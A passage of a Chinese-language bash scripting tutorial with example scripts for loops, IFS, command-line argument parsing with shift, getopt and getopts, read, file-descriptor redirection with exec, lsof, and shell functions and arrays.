​</p><ul><li><p>复合条件测试</p><p>允许使用布尔逻辑来组合测试</p></li></ul><h4 id="case命令"><a href="#case命令" class="headerlink" title="case命令"></a>case命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">case variable in </span><br><span class="line">pattern1 | pattern2 ) </span><br><span class="line">commands;;</span><br><span class="line">pattern3)</span><br><span class="line">commands;;</span><br><span class="line">*)</span><br><span class="line">default commands;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>!/bin/bash </span><br><span class="line"></span><br><span class="line">case $USER in </span><br><span class="line">    Postgres | root) </span><br><span class="line">        echo "Welcome , $USER";;</span><br><span class="line">    testing)</span><br><span class="line">        echo "teting";;</span><br><span class="line">    *)</span><br><span class="line">        echo "default case";;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><h4 id="for-命令"><a href="#for-命令" class="headerlink" title="for 命令"></a>for 命令</h4><p>重复一组命令直到某个特定条件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">for var in list </span><br><span class="line">do </span><br><span class="line">commands</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">for var in I don\`t know </span><br><span class="line">do</span><br><span class="line">    echo word:$var</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">结果输出:</span><br><span class="line">word:I</span><br><span class="line">word:don`t</span><br><span class="line">word:know</span><br></pre></td></tr></table></figure><h5 id="通配符读取一系列参数"><a href="#通配符读取一系列参数" class="headerlink" title="通配符读取一系列参数"></a>通配符读取一系列参数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for var in /etc/*</span><br><span class="line">do</span><br><span class="line">if [ -d $var ]</span><br><span class="line">then </span><br><span class="line">echo "$var is a dir"</span><br><span class="line">elif [ -f $var ]</span><br><span class="line">then </span><br><span class="line">echo "$var is a file"</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="C-风格for循环"><a href="#C-风格for循环" class="headerlink" title="C 风格for循环"></a>C 风格for循环</h4><p>(( expression ))   :  提供高级数学表达式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for (( variable assignment;  condition; iteration process ))</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">for (( a = 1; a &lt; 10; a++ ))</span><br><span class="line">do</span><br><span class="line">    echo "a = $a"</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="While-命令"><a href="#While-命令" class="headerlink" title="While 命令"></a>While 命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while test command</span><br><span class="line">do </span><br><span class="line">other commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="Until-命令"><a href="#Until-命令" class="headerlink" title="Until 命令"></a>Until 命令</h4><p>until命令要求你指定一个通常<strong>返回非零退出状态的测试命令</strong> 只有测试命令的退出状态码不为0, shell 才会执行循环中列出的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until test commands</span><br><span class="line">do</span><br><span class="line">other commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="控制循环"><a href="#控制循环" class="headerlink" title="控制循环"></a>控制循环</h4><ul><li><p>break</p><p>break 是退出循环的一个简单办法. 可以用break来退出任意一种循环, 包括for, while, until</p></li><li><p>continue</p><p>continue 提前终止某次循环 中的命令, 但不会完全终止整个循环;</p></li></ul><h4 id="更改字段分隔符-IFS"><a href="#更改字段分隔符-IFS" class="headerlink" title="更改字段分隔符 IFS"></a>更改字段分隔符 IFS</h4><p>环境变量IFS , 叫做内部字段分隔符(internal field separator)  : 定义了bash shell用作字符分隔符的一系列字符</p><p>默认:</p><ul><li>空格</li><li>制表符</li><li>换行符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">示例1:  采用默认IFS</span><br><span class="line"><span class="meta">#</span>!/bin/bash </span><br><span class="line"></span><br><span class="line">file="yunsuan.sh"</span><br><span class="line"></span><br><span class="line">for var in $(cat $file)</span><br><span class="line">do </span><br><span class="line">    echo "$var"</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">输出结果:</span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">if</span><br><span class="line">[[</span><br><span class="line"><span class="meta">$</span>USER</span><br><span class="line">==</span><br><span class="line">lig?ng</span><br><span class="line">]]</span><br><span class="line">then</span><br><span class="line">echo</span><br><span class="line">"hello,</span><br><span class="line">Postgres"</span><br><span class="line">else</span><br><span class="line">echo</span><br><span class="line">"Sorry,</span><br><span class="line">I</span><br><span class="line">do</span><br><span class="line">not</span><br><span class="line">kown</span><br><span class="line">you"</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">示例2： 修改IFS=$'\t'</span><br><span class="line"><span class="meta">#</span>!/bin/bash </span><br><span class="line"></span><br><span class="line">IFS=$'\t'</span><br><span class="line">file="yunsuan.sh"</span><br><span class="line"></span><br><span class="line">for var in $(cat $file)</span><br><span class="line">do </span><br><span class="line">    echo "$var"</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">if [[ $USER == lig?ng ]]</span><br><span class="line">then</span><br><span class="line">    echo "hello, Postgres"</span><br><span class="line">else</span><br><span class="line">    echo "Sorry, I do not kown you"</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h5 id="指定多个字符"><a href="#指定多个字符" class="headerlink" title="指定多个字符"></a>指定多个字符</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFS=$'\n':;"            ## 将换行符, 冒号, 分号, 双引号作为字符分隔符</span><br></pre></td></tr></table></figure><h3 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h3><h4 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h4><ul><li>\$0    程序名</li></ul><ul><li><p>\$1    第一个参数</p></li><li><p>$$    程序pid</p></li><li><p>\$#    脚本运行时 携带命令的参数个数;     \${ $# } 并不能获取最后一个参数 –&gt;  not</p></li><li><p>\${ !# } 用来获取最后一个参数       </p></li><li><p>\$*    \$@   访问所有参数  </p><ul><li><p>\$*   将所有参数当做一个单词保存 </p></li><li><p>\$@   将所有参数当做同一个字符串中的多个独立单词</p></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for var in "$@"</span><br><span class="line">do</span><br><span class="line">    echo $var</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo </span><br><span class="line">echo</span><br></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for var in "$*"</span><br><span class="line">do</span><br><span class="line">    echo $var</span><br><span class="line">done</span><br></pre></td></tr></table></figure><pre><code>执行: ./addnum.sh this is work 输出:thisiswork</code></pre><p>  <strong>去掉双引号, \$* 与 \$@ 效果相同</strong> </p><h4 id="移动变量-shift"><a href="#移动变量-shift" class="headerlink" title="移动变量 shift"></a>移动变量 shift</h4><p>shift 命令会根据它们的相对位置来移动命令行参数;  默认情况下, shift 将每个参数变量向左移动一个位置, 变量\$3的值移动到\$2,  \$2的值将会移动到\$1中;而\$1的值将会被删除掉;</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">while [ -n "$1" ]</span><br><span class="line">do</span><br><span class="line">    echo "$1"</span><br><span class="line">    shift</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">./shift.sh 1 2 3 4 5 6 </span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span># 处理参数列表</span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while [ -n "$1" ]</span><br><span class="line">do</span><br><span class="line">    case "$1" in</span><br><span class="line">        -a) </span><br><span class="line">            if [ -n "$2" ]</span><br><span class="line">            then</span><br><span class="line">                echo "-a option : "$2""</span><br><span class="line">                shift</span><br><span class="line">            else</span><br><span class="line">                echo "Not Fount -a Paramenter"</span><br><span class="line">            fi</span><br><span class="line">            ;;</span><br><span class="line"></span><br><span class="line">        -b) </span><br><span class="line">            if [ -n "$2" ]</span><br><span class="line">            then</span><br><span class="line">                echo "-b option : "$2""</span><br><span class="line">                shift</span><br><span class="line">            else</span><br><span class="line">                echo "Not Fount -b Paramenter"</span><br><span class="line">            fi</span><br><span class="line">            ;;</span><br><span class="line"></span><br><span class="line">        --help) </span><br><span class="line">            echo "Not Found the --help option"</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            echo "Usage: default option"</span><br><span class="line">    esac</span><br><span class="line">    shift</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">./shift.sh -a hello -b world --help </span><br><span class="line">输出:</span><br><span class="line">-a option : hello</span><br><span class="line">-b option : world</span><br><span class="line">Not Found the --help option</span><br></pre></td></tr></table></figure><h4 id="getopt-命令-处理命令行"><a href="#getopt-命令-处理命令行" class="headerlink" title="getopt 命令: 处理命令行"></a>getopt 命令: 处理命令行</h4><p>getopt命令是一个处理命令行选项和参数时非常方便的工具, 能识别命令行参数, 从而在脚本中解析它们;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getopt  optstring  parameters</span><br></pre></td></tr></table></figure><p>optstring 是关键所在,   它定义了命令行有效的选项字母, 还定义了哪些选项字母需要参数值.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getopt ab:c -ac -b nihao ifs.sh </span><br><span class="line">$(show):  -a -c -b nihao -- ifs.sh</span><br></pre></td></tr></table></figure><ol><li>冒号(:)   被放在b后边, 因为b选项需要一个参数值</li><li>-ac  会自动拆分成两个单独参数,并插入双破折线来分隔行中的额外参数  ifs.sh</li><li>加入不存在选项,  将会产生错误值 :  -q 可以忽略错误信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -- $(getopt -1 ab:cd &quot;$@&quot;)  ## 用getopt命令生成的格式化后的版本来替换已有的命令行选项和参数</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">set -- $(getopt -q ab "$@")</span><br><span class="line"></span><br><span class="line">while [ -n "$1" ]</span><br><span class="line">do</span><br><span class="line">    case "$1" in</span><br><span class="line">        -a) </span><br><span class="line">                echo "-a option  "</span><br><span class="line">            ;;</span><br><span class="line">        -b) </span><br><span class="line">                echo "-b option "</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            echo "Usage: default option"</span><br><span class="line">;;</span><br><span class="line">    esac</span><br><span class="line">    shift</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">// 上一个处理命令行不能识别   ./shift -ab</span><br></pre></td></tr></table></figure><h4 id="getopts"><a href="#getopts" class="headerlink" title="getopts"></a>getopts</h4><p>getopts 是 getops的扩展版;</p><p>一次只能处理命令行上检测到的一个参数, 处理完所有参数后, 它会退出并返回一个大于0的退出状态码.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getopts optstring variable</span><br></pre></td></tr></table></figure><h4 id="read-用户读取"><a href="#read-用户读取" class="headerlink" title="read 用户读取"></a>read 用户读取</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">read name  ## 直接读取</span><br><span class="line">read -p  "Enter you name"  name</span><br><span class="line"></span><br><span class="line">如果 read 不指定变量， 将存储值 REPLY 环境变量中</span><br><span class="line"><span class="meta">#</span>!/bin/bash </span><br><span class="line"></span><br><span class="line">read -p "Enter your name: " </span><br><span class="line">echo "hello, $REPLY, welcome to tty"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">Enter your name: Postgres </span><br><span class="line">hello, Postgres , welcome to tty</span><br></pre></td></tr></table></figure><h5 id="超时-read-t"><a href="#超时-read-t" class="headerlink" title="超时  read -t"></a>超时  read -t</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -t 5 -p "Enter your name"  name</span><br></pre></td></tr></table></figure><h5 id="隐式读取密码"><a href="#隐式读取密码" class="headerlink" title="隐式读取密码"></a>隐式读取密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -s -p &quot;Enter your password: &quot; passwd</span><br></pre></td></tr></table></figure><h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat filename | while read line</span><br><span class="line">do</span><br><span class="line">echo $line</span><br><span class="line">done </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span># 方法二</span><br><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">echo $line</span><br><span class="line">done &lt; filename</span><br></pre></td></tr></table></figure><h4 id="标准文件描述符"><a href="#标准文件描述符" class="headerlink" title="标准文件描述符"></a>标准文件描述符</h4><p>Linux系统将每个对象当做文件处理, Linux用文件描述符来标识每个文件对象, 文件描述符是非负整数 ,  每个进程一次最多可以有九个文件描述符.    处于特殊目的, bash shell将保留前三个文件描述符( 0, 1, 2)</p><ul><li>STDIN</li><li>STDOUT</li><li>STDERR</li></ul><h5 id="重定输出-gt-amp-gt"><a href="#重定输出-gt-amp-gt" class="headerlink" title="重定输出  &gt;     &amp;&gt;"></a>重定输出  &gt;     &amp;&gt;</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commands 2&gt; test.file</span><br><span class="line">commands 2&gt; test1.file  1&gt; test2.file    ##将标准错误输出到test1.file 标准输出到test2.file</span><br></pre></td></tr></table></figure><p><strong>也可以将STDERR和STDOUT的输出重定向到同一个输出文件, 为此bash shell提供  &amp;&gt; 重定向操作符</strong></p><h5 id="临时重定向-gt-amp"><a href="#临时重定向-gt-amp" class="headerlink" title="临时重定向   &gt;&amp;"></a>临时重定向   &gt;&amp;</h5><p>重定向到文件描述符时, 必须在文件描述符数组之前加 &amp; </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;this is err&quot;  &gt;&amp;2  ##关联到 stderr</span><br></pre></td></tr></table></figure><h5 id="永久重定向"><a href="#永久重定向" class="headerlink" title="永久重定向"></a>永久重定向</h5><p>脚本中有大量数据需要重定向,每个都使用echo 很繁琐, 因此可以使用exec 告诉shell脚本执行期间重定向某个特定文件描述符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt; test.file    ## 重新启动新的shell进行stdout文件描述符重定向</span><br><span class="line"></span><br><span class="line">echo &quot;this is a test of redirecting all output&quot;   ## 将输入到test.file</span><br></pre></td></tr></table></figure><h6 id="创建自己的重定向"><a href="#创建自己的重定向" class="headerlink" title="创建自己的重定向"></a>创建自己的重定向</h6><p> 每个进程一次最多可以有九个文件描述符, 除了系统占用 0, 1, 2  还有其他6个均可以作为输入或输出重定向., 可以将这些文件描述符中的任何一个分配给文件.并使用它们.</p><h6 id="创建文件描述符"><a href="#创建文件描述符" class="headerlink" title="创建文件描述符"></a>创建文件描述符</h6><p>使用exec命令创建文件描述符, 并将文件描述符分配给某一文件, 使文件描述符生效.</p><ol><li><p>输出文件描述符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec  3&gt;&gt; filename</span><br><span class="line">exec  3&gt;  filename</span><br><span class="line"></span><br><span class="line">exec 3&gt;&amp;1   将新分配文件描述符 关联到 标准输出 参考 unistd::dup2();</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">重定向示例:</span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">exec 3&gt;&amp;1  ## stdout 关联到3  即 3 也是标准输出;</span><br><span class="line">exec 1&gt;test.file   ## 标准输出重定向至 test.file文件</span><br><span class="line"></span><br><span class="line">echo "this is test all output"   ## 标准输出将1:文件描述符 重新关联 stdout;    其中文件描述符仅仅做了临时变量作用; </span><br><span class="line">exec 1&gt;&amp;3</span><br><span class="line"></span><br><span class="line">输出到stdout;</span><br><span class="line">   echo "hello,world"</span><br><span class="line"></span><br><span class="line">   输出结果:</span><br><span class="line"><span class="meta">   $</span>./exec.sh </span><br><span class="line">   hello,world</span><br><span class="line"><span class="meta">   $</span> cat test.file </span><br><span class="line">   this is test all output</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>读写文件描述符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line">exec 4&lt;&gt;test.file</span><br><span class="line">read line &lt;&amp;4</span><br><span class="line">echo "read: $line"</span><br></pre></td></tr></table></figure></li><li><p>关闭文件描述符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exec 3&gt;&amp;-   ##关闭文件描述符, 需要将其重定向至特殊符号&amp;-</span><br><span class="line">     </span><br><span class="line"><span class="meta">$</span>cat badfile.sh:</span><br><span class="line">exec 4&gt;test</span><br><span class="line">echo "hello,world" &gt;&amp;4</span><br><span class="line">exec 4&gt;&amp;-</span><br><span class="line">echo "this is bad file desc" &gt;&amp;4</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span>./badfile.sh </span><br><span class="line">./badfile.sh: 行 10: 4: 错误的文件描述符</span><br></pre></td></tr></table></figure></li><li><p>列出打开的文件描述符 lsof</p><p>lsof 命令可以列出整个linux系统打开的所有文件描述符. 但是它会向非系统管理员用户提供Linux系统信息</p><p>常用参数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-p   指定进程pid</span><br><span class="line">-d   允许指定要显示的文件描述符编号</span><br><span class="line">-a   用来对其他两个结果执行布尔AND运算操作.</span><br><span class="line"></span><br><span class="line">lsof -a -p $$ -d 0,1,2</span><br><span class="line">COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">zsh     26913 Postgres    0u   CHR  136,3      0t0    6 /dev/pts/3</span><br><span class="line">zsh     26913 Postgres    1u   CHR  136,3      0t0    6 /dev/pts/3</span><br><span class="line">zsh     26913 Postgres    2u   CHR  136,3      0t0    6 /dev/pts/3</span><br><span class="line"></span><br><span class="line">   FD:     文件描述符以及访问类型(r代表读， w代表写, u代表读写)</span><br><span class="line">   TYPE:   文件的类型(CHR 字符类型, BLK  块类型, DIR  目录,  REG  常规文件)</span><br><span class="line">   DEVICE: 设备号(主设备号 和 从设备号)</span><br><span class="line">   size：  文件大小</span><br><span class="line">   NODE:   本地文件的节点号</span><br><span class="line">   NAME:   本地文件名</span><br></pre></td></tr></table></figure></li></ol><p>​     <a href="https://www.ibm.com/developerworks/cn/aix/library/au-lsof.html" target="_blank" rel="noopener">IBM lsof学习</a></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h4><ol><li><p>采用function关键字</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function name&#123;</span><br><span class="line">  commands;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name() &#123;</span><br><span class="line">  commands;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><ol><li><p>默认退出状态码</p><p>函数的默认退出状态码是函数最后一条命令返回的退出状态码  可以用 $? 来确定</p></li><li><p>return命令</p><p>bash shell使用return命令来退出函数并返回特定的退出状态码</p><ul><li>若是取值， 函数一结束就取返回值</li><li>退出状态码必须在0-255</li></ul></li></ol><h4 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h4><p>在脚本中指定函数时，将参数和函数放置在同一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">funcname  argv1  argv2</span><br></pre></td></tr></table></figure><h4 id="函数变量"><a href="#函数变量" class="headerlink" title="函数变量"></a>函数变量</h4><ul><li>全局变量</li><li>局部变量<ul><li>使用 local 来声明</li><li>local 关键字保证了变量只局限与该函数中, 如果脚本中在该函数之外有同样的名字变量, 那么shell将会保持两个变量的值是分离的</li></ul></li></ul><h4 id="数组变量-和-函数"><a href="#数组变量-和-函数" class="headerlink" title="数组变量 和 函数"></a>数组变量 和 函数</h4><ul><li><p>向函数传递数组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function testit()&#123;</span><br><span class="line">    local newarray</span><br><span class="line">    newarray=$(echo "$@")</span><br><span class="line">    echo "newarray is : $&#123;newarray[*]&#125;"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">old=(1 2 3 4 5)</span><br><span class="line"></span><br><span class="line">testit $&#123;old[*]&#125;</span><br></pre></td></tr></table></figure></li><li><p>从函数返回数组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function array()&#123;</span><br><span class="line">    local array</span><br><span class="line">    local i</span><br><span class="line">    for (( i=0; i&lt;=10; i++ ))</span><br><span class="line">    &#123;  ## or do</span><br><span class="line">        array[$i]=$[ i * 2 ]</span><br><span class="line">    &#125;  ## or done</span><br><span class="line">    echo $&#123;array[*]&#125;</span><br><span class="line">&#125;</span><br><span 